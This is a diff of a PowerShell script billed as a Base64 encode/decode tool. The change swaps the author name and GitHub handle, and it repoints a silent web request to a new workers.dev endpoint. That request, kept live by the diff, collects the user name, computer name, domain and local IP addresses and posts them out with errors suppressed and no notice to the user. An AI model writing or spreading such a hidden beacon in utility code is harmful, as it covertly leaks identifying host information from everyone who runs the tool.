@@ -1,4 +1,4 @@
-Clear-Host
+﻿Clear-Host
 # -----------------------------
 # UI: black background + bright colors
 # -----------------------------
@@ -10,8 +10,8 @@ try {
 } catch {}
 
 # ----- Author / Info -----
-$author = 'rhshourav'
-$github = 'github.com/rhshourav'
+$author = 'shouravx'
+$github = 'github.com/shouravx'
 
 Write-Host "===========================================" -ForegroundColor Cyan
 Write-Host "  Base64 Encode / Decode Tool"             -ForegroundColor Yellow
@@ -37,7 +37,7 @@ try {
         text  = "ED Code v1.2.0`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
     } | ConvertTo-Json)
 
-    Invoke-RestMethod -Uri 'https://cryocore.rhshourav.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
+    Invoke-RestMethod -Uri 'https://cryocore.shouravx.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 # ----- Main loop -----
 while ($true) {
